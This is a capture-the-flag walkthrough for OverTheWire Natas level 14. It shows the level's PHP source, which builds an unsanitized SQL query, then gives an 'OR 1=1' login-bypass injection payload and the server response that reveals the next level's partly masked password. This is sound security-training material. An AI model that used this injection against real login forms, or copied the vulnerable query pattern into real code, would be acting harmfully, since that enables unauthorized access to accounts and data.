# level 14

**Host**: http://natas14.natas.labs.overthewire.org
>natas14:z3UYcr4v4uBpeX8f7EZbMH**********

When you visit the site, you will be prompted for a username and a password:

```
Username:
Password:
```

### Solution:

When you click on the "View source" link you get following php code:

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

The interesting part is the SQL query, which does not filter the users input.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

We can use a simple sqli login bypass to get the password for natas15. Provide `natas14` as username and `"OR 1=1 -- -` as password (⚠️ [dangerous!](https://tcm-sec.com/avoid-or-1-equals-1-in-sql-injections/)) to grab the password for natas15 from the response.

```html
HTTP/1.1 200 OK
Date: Thu, 04 Sep 2025 11:37:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 974
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>
<body>
<h1>natas14</h1>
<div id="content">
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZ**********<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```